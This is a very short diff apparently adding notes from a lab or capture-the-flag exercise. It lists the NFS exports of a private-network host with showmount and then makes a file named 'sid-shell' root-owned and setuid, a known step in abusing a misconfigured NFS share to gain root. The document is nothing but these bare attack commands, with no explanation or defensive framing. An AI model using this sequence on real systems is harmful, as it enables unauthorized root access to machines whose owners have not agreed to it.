@@ -1,0 +1,3 @@
+showmount -e 192.168.110.102
+chown root:root sid-shell; chmod +s sid-shell
+
